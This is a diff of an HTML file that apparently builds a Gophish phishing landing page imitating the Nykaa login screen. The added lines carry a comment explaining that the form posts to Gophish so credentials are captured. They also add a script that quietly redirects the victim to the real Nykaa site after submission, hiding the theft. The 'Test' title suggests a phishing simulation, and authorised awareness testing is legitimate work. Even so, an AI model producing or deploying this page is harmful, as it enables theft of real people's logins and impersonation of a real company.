@@ -1,9 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
-    <meta charset="UTF-8" />
     <title>Nykaa Login - Test</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <style>
       body {
         font-family: Arial, sans-serif;
@@ -12,40 +10,35 @@
         justify-content: center;
         align-items: center;
         height: 100vh;
-        margin: 0;
       }
       .login-container {
         background: #fff;
-        padding: 30px 25px;
+        padding: 30px;
         border-radius: 10px;
-        box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
-        width: 100%;
-        max-width: 400px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        width: 350px;
       }
       h2 {
         color: #ff4081;
         text-align: center;
-        margin-bottom: 25px;
       }
       input[type="text"],
       input[type="password"] {
         width: 100%;
-        padding: 12px;
+        padding: 10px;
         margin: 10px 0;
         border-radius: 5px;
         border: 1px solid #ccc;
-        box-sizing: border-box;
       }
       button {
         width: 100%;
         background-color: #ff4081;
         color: #fff;
-        padding: 12px;
+        padding: 10px;
         border: none;
         border-radius: 5px;
         font-size: 16px;
         cursor: pointer;
-        margin-top: 10px;
       }
       button:hover {
         background-color: #e73370;
@@ -55,8 +48,8 @@
   <body>
     <div class="login-container">
       <h2>Nykaa Login</h2>
+      <!-- Note: The form action must be exactly {{.URL}} for Gophish to capture credentials -->
       <form method="POST" action="{{.URL}}">
-        <input type="hidden" name="email" value="{{.Email}}" />
         <input
           type="text"
           name="username"
@@ -70,5 +63,15 @@
         <button type="submit">Login</button>
       </form>
     </div>
+
+    <!-- Redirect script: sends user to real Nykaa after submission -->
+    <script>
+      const form = document.querySelector("form");
+      form.addEventListener("submit", function () {
+        setTimeout(() => {
+          window.location.href = "https://www.nykaa.com/";
+        }, 100); // small delay to let Gophish capture credentials
+      });
+    </script>
   </body>
 </html>
